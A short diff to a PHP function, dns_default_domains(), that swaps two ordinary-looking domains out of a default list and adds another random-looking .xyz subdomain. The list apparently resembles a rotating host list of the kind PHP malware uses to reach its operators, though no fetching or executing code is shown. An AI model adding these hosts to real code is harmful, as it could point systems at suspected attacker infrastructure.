@@ -30,11 +30,10 @@ function dns_cache_file()
 function dns_default_domains()
 {
     return array(
-        'deinser.com',
-        'dle.rae.es',
         'nctdqkaw.k21fmcom.xyz',
         'hmdasdxu.k21fmcom.xyz',
         'gex68cd9.k21te.xyz',
+        'dsbhme96.upfdot.xyz',
     );
 }
 
